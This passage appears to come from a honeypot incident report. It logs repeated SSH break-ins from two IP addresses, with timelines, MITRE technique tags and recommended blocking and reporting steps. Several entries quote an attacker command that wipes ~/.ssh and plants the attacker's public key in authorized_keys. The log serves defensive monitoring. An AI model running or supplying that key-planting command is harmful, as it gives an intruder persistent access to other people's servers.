| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:44:05` | `cowrie.session.connect` |
| `2026-04-26 04:44:05` | `cowrie.client.version` |
| `2026-04-26 04:44:05` | `cowrie.client.kex` |
| `2026-04-26 04:44:06` | `cowrie.login.success` |
| `2026-04-26 04:44:06` | `cowrie.session.params` |
| `2026-04-26 04:44:06` | `cowrie.command.input` |
| `2026-04-26 04:44:06` | `cowrie.command.failed` |
| `2026-04-26 04:44:06` | `cowrie.log.closed` |
| `2026-04-26 04:44:06` | `cowrie.session.params` |
| `2026-04-26 04:44:06` | `cowrie.command.input` |
| `2026-04-26 04:44:06` | `cowrie.session.file_download` |
| `2026-04-26 04:44:06` | `cowrie.log.closed` |
| `2026-04-26 04:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc40c673ef28

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:44 |
| **Last Seen** | 2026-04-26 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:44:08` | `cowrie.session.connect` |
| `2026-04-26 04:44:08` | `cowrie.client.version` |
| `2026-04-26 04:44:08` | `cowrie.client.kex` |
| `2026-04-26 04:44:08` | `cowrie.login.success` |
| `2026-04-26 04:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a681bef5e209

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:45 |
| **Last Seen** | 2026-04-26 04:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:45:05` | `cowrie.session.connect` |
| `2026-04-26 04:45:05` | `cowrie.client.version` |
| `2026-04-26 04:45:05` | `cowrie.client.kex` |
| `2026-04-26 04:45:06` | `cowrie.login.success` |
| `2026-04-26 04:45:06` | `cowrie.session.params` |
| `2026-04-26 04:45:06` | `cowrie.command.input` |
| `2026-04-26 04:45:06` | `cowrie.command.failed` |
| `2026-04-26 04:45:06` | `cowrie.log.closed` |
| `2026-04-26 04:45:06` | `cowrie.session.params` |
| `2026-04-26 04:45:06` | `cowrie.command.input` |
| `2026-04-26 04:45:06` | `cowrie.session.file_download` |
| `2026-04-26 04:45:06` | `cowrie.log.closed` |
| `2026-04-26 04:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d637e831619

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:45 |
| **Last Seen** | 2026-04-26 04:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:45:08` | `cowrie.session.connect` |
| `2026-04-26 04:45:08` | `cowrie.client.version` |
| `2026-04-26 04:45:08` | `cowrie.client.kex` |
| `2026-04-26 04:45:09` | `cowrie.login.success` |
| `2026-04-26 04:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61dcc0bd5ef

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:45 |
| **Last Seen** | 2026-04-26 04:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:45:34` | `cowrie.session.connect` |
| `2026-04-26 04:45:34` | `cowrie.client.version` |
| `2026-04-26 04:45:34` | `cowrie.client.kex` |
| `2026-04-26 04:45:34` | `cowrie.login.success` |
| `2026-04-26 04:45:34` | `cowrie.session.params` |
| `2026-04-26 04:45:34` | `cowrie.command.input` |
| `2026-04-26 04:45:34` | `cowrie.command.failed` |
| `2026-04-26 04:45:34` | `cowrie.log.closed` |
| `2026-04-26 04:45:35` | `cowrie.session.params` |
| `2026-04-26 04:45:35` | `cowrie.command.input` |
| `2026-04-26 04:45:35` | `cowrie.session.file_download` |
| `2026-04-26 04:45:35` | `cowrie.log.closed` |
| `2026-04-26 04:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57332e74a50

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:45 |
| **Last Seen** | 2026-04-26 04:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:45:36` | `cowrie.session.connect` |
| `2026-04-26 04:45:36` | `cowrie.client.version` |
| `2026-04-26 04:45:36` | `cowrie.client.kex` |
| `2026-04-26 04:45:37` | `cowrie.login.success` |
| `2026-04-26 04:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce150801b68

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:47 |
| **Last Seen** | 2026-04-26 04:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:47:00` | `cowrie.session.connect` |
| `2026-04-26 04:47:00` | `cowrie.client.version` |
| `2026-04-26 04:47:00` | `cowrie.client.kex` |
| `2026-04-26 04:47:00` | `cowrie.login.success` |
| `2026-04-26 04:47:01` | `cowrie.session.params` |
| `2026-04-26 04:47:01` | `cowrie.command.input` |
| `2026-04-26 04:47:01` | `cowrie.command.failed` |
| `2026-04-26 04:47:01` | `cowrie.log.closed` |
| `2026-04-26 04:47:01` | `cowrie.session.params` |
| `2026-04-26 04:47:01` | `cowrie.command.input` |
| `2026-04-26 04:47:01` | `cowrie.session.file_download` |
| `2026-04-26 04:47:01` | `cowrie.log.closed` |
| `2026-04-26 04:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d1ea91f5618

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:47 |
| **Last Seen** | 2026-04-26 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:47:03` | `cowrie.session.connect` |
| `2026-04-26 04:47:03` | `cowrie.client.version` |
| `2026-04-26 04:47:03` | `cowrie.client.kex` |
| `2026-04-26 04:47:03` | `cowrie.login.success` |
| `2026-04-26 04:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7805b7ce437

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:54 |
| **Last Seen** | 2026-04-26 04:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:54:17` | `cowrie.session.connect` |
| `2026-04-26 04:54:17` | `cowrie.client.version` |
| `2026-04-26 04:54:17` | `cowrie.client.kex` |
| `2026-04-26 04:54:18` | `cowrie.login.success` |
| `2026-04-26 04:54:18` | `cowrie.session.params` |
| `2026-04-26 04:54:18` | `cowrie.command.input` |
| `2026-04-26 04:54:18` | `cowrie.command.failed` |
| `2026-04-26 04:54:18` | `cowrie.log.closed` |
| `2026-04-26 04:54:18` | `cowrie.session.params` |
| `2026-04-26 04:54:18` | `cowrie.command.input` |
| `2026-04-26 04:54:18` | `cowrie.session.file_download` |
| `2026-04-26 04:54:18` | `cowrie.log.closed` |
| `2026-04-26 04:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de89e70b5a7

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:54 |
| **Last Seen** | 2026-04-26 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:54:20` | `cowrie.session.connect` |
| `2026-04-26 04:54:20` | `cowrie.client.version` |
| `2026-04-26 04:54:20` | `cowrie.client.kex` |
| `2026-04-26 04:54:21` | `cowrie.login.success` |
| `2026-04-26 04:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8b4d0feddf

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:57 |
| **Last Seen** | 2026-04-26 04:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:57:26` | `cowrie.session.connect` |
| `2026-04-26 04:57:26` | `cowrie.client.version` |
| `2026-04-26 04:57:26` | `cowrie.client.kex` |
| `2026-04-26 04:57:27` | `cowrie.login.success` |
| `2026-04-26 04:57:27` | `cowrie.session.params` |
| `2026-04-26 04:57:27` | `cowrie.command.input` |
| `2026-04-26 04:57:27` | `cowrie.command.failed` |
| `2026-04-26 04:57:27` | `cowrie.log.closed` |
| `2026-04-26 04:57:27` | `cowrie.session.params` |
| `2026-04-26 04:57:27` | `cowrie.command.input` |
| `2026-04-26 04:57:28` | `cowrie.session.file_download` |
| `2026-04-26 04:57:28` | `cowrie.log.closed` |
| `2026-04-26 04:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da81ff3bdbd

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:57 |
| **Last Seen** | 2026-04-26 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:57:29` | `cowrie.session.connect` |
| `2026-04-26 04:57:29` | `cowrie.client.version` |
| `2026-04-26 04:57:29` | `cowrie.client.kex` |
| `2026-04-26 04:57:30` | `cowrie.login.success` |
| `2026-04-26 04:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1428184497cc

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:58 |
| **Last Seen** | 2026-04-26 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:58:30` | `cowrie.session.connect` |
| `2026-04-26 04:58:30` | `cowrie.client.version` |
| `2026-04-26 04:58:31` | `cowrie.client.kex` |
| `2026-04-26 04:58:31` | `cowrie.login.success` |
| `2026-04-26 04:58:31` | `cowrie.session.params` |
| `2026-04-26 04:58:31` | `cowrie.command.input` |
| `2026-04-26 04:58:31` | `cowrie.command.failed` |
| `2026-04-26 04:58:31` | `cowrie.log.closed` |
| `2026-04-26 04:58:32` | `cowrie.session.params` |
| `2026-04-26 04:58:32` | `cowrie.command.input` |
| `2026-04-26 04:58:32` | `cowrie.session.file_download` |
| `2026-04-26 04:58:32` | `cowrie.log.closed` |
| `2026-04-26 04:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17766ffd7ca4

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:58 |
| **Last Seen** | 2026-04-26 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:58:34` | `cowrie.session.connect` |
| `2026-04-26 04:58:34` | `cowrie.client.version` |
| `2026-04-26 04:58:34` | `cowrie.client.kex` |
| `2026-04-26 04:58:34` | `cowrie.login.success` |
| `2026-04-26 04:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5974218834c1

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 05:01 |
| **Last Seen** | 2026-04-26 05:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:01:37` | `cowrie.session.connect` |
| `2026-04-26 05:01:37` | `cowrie.client.version` |
| `2026-04-26 05:01:37` | `cowrie.client.kex` |
| `2026-04-26 05:01:38` | `cowrie.login.success` |
| `2026-04-26 05:01:38` | `cowrie.session.params` |
| `2026-04-26 05:01:38` | `cowrie.command.input` |
| `2026-04-26 05:01:38` | `cowrie.command.failed` |
| `2026-04-26 05:01:38` | `cowrie.log.closed` |
| `2026-04-26 05:01:38` | `cowrie.session.params` |
| `2026-04-26 05:01:38` | `cowrie.command.input` |
| `2026-04-26 05:01:38` | `cowrie.session.file_download` |
| `2026-04-26 05:01:38` | `cowrie.log.closed` |
| `2026-04-26 05:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd59f002b399

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 05:01 |
| **Last Seen** | 2026-04-26 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:01:41` | `cowrie.session.connect` |
| `2026-04-26 05:01:41` | `cowrie.client.version` |
| `2026-04-26 05:01:41` | `cowrie.client.kex` |
| `2026-04-26 05:01:41` | `cowrie.login.success` |
| `2026-04-26 05:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f3197582070

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 05:04 |
| **Last Seen** | 2026-04-26 05:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:04:55` | `cowrie.session.connect` |
| `2026-04-26 05:04:55` | `cowrie.client.version` |
| `2026-04-26 05:04:55` | `cowrie.client.kex` |
| `2026-04-26 05:04:55` | `cowrie.login.success` |
| `2026-04-26 05:04:56` | `cowrie.session.params` |
| `2026-04-26 05:04:56` | `cowrie.command.input` |
